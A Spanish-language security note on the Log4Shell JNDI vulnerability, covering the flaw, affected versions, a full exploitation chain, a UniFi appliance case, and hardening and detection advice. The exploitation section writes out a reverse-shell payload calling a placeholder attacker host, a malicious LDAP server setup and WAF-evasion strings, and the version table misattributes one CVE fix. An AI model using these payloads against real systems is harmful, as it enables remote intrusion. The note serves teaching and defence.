---
topic: log4shell
tags: [web, java, log4j, jndi, rce, cve-2021-44228]
---

# Log4Shell (CVE-2021-44228) — de un `User-Agent` a RCE

[🇬🇧 English](log4shell.en.md) | **Español**

> Nota reutilizable. No publicar payloads apuntando a infraestructura real.

## Idea

Log4j 2.x resuelve *lookups* dentro de los mensajes que registra. Si un valor controlado por el atacante llega a un `logger.info(...)` (cabecera, parámetro, nombre de usuario), el `${jndi:ldap://...}` se interpreta y Log4j descarga y ejecuta una clase remota. Es ejecución de código **antes de autenticar**, en cualquier campo que acabe en el log.

## Versiones afectadas

| Rango | Estado |
|---|---|
| 2.0-beta9 → 2.14.1 | Vulnerable a CVE-2021-44228 |
| 2.15.0 | Corrige JNDI LDAP pero deja DoS y bypasses (CVE-2021-45046) |
| 2.16.0 | Deshabilita JNDI por defecto (CVE-2021-45105) |
| 2.17.0+ | Correcciones completas de la familia |

## Detección

Cualquier entrada que se registre: `User-Agent`, `X-Forwarded-For`, `Referer`, nombre de usuario, campo de búsqueda, parámetro `remember`, cabeceras de dispositivos.

```bash
# callback DNS: si llega la petición, el lookup se resuelve
curl -s http://<HOST>/ -H 'User-Agent: ${jndi:ldap://<ATACANTE>.oast.fun/a}'
```

Señales: una resolución DNS o conexión LDAP al dominio controlado. Un `tcpdump` en el puerto 389 confirma lo mismo sin servicios externos.

## Explotación típica

```bash
# 1) servidor LDAP malicioso que sirve la clase
java -jar target/RogueJndi-1.1.jar \
  --command "bash -c 'bash -i >& /dev/tcp/<ATACANTE>/4444 0>&1'" \
  --hostname <ATACANTE>

# 2) listener
nc -lvnp 4444

# 3) disparar el lookup
curl -s 'https://<HOST>:8443/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"x","password":"x","remember":"${jndi:ldap://<ATACANTE>:389/a}"}'
```

Variantes de ofuscación cuando hay WAF: `${${lower:j}ndi:...}`, `${jndi:${lower:l}dap://...}`, `${env:...}`.

## Por qué funciona

- Log4j **interpola** el mensaje antes de escribirlo.
- JNDI permite cargar clases de un servidor LDAP/RMI remoto.
- Muchos frameworks (Spring, UniFi, Minecraft, Elasticsearch, Solr, aplicaciones de escritorio) usan Log4j 2 sin fijar versión.

## Explotación en un appliance (caso UniFi)

1. Identificar versión con `curl -sk https://<HOST>:8443/status`.
2. Confirmar callback con `tcpdump -i tun0 port 389`.
3. Levantar `rogue-jndi` y disparar el `remember` del login.
4. Desde la shell, enumerar servicios locales (`ps aux`, `ss -tlnp`) y bases embebidas (MongoDB en 27117).

## Blindaje

- Actualizar Log4j a **2.17.1+** (o 2.12.4/2.3.2 en ramas antiguas).
- `-Dlog4j2.formatMsgNoLookups=true` como mitigación temporal en versiones antiguas.
- Retirar la clase `JndiLookup` del JAR (`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).
- Bloquear salidas LDAP/RMI/DNS desde servidores de aplicación.
- WAF con reglas para `${jndi:` y `${${`.

## Detección

- `${jndi:` o `${${` en logs del WAF, del proxy o de la propia aplicación.
- Conexiones salientes al 389/636/1099 desde servidores web o appliances.
- Procesos `java` con hijos `bash`/`sh` o descargas de clases desde IPs externas.
- En appliances: peticiones de login con `remember` que no son un token válido.

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2021-44228>
- <https://logging.apache.org/log4j/2.x/security.html>
- <https://github.com/veracode-research/rogue-jndi>
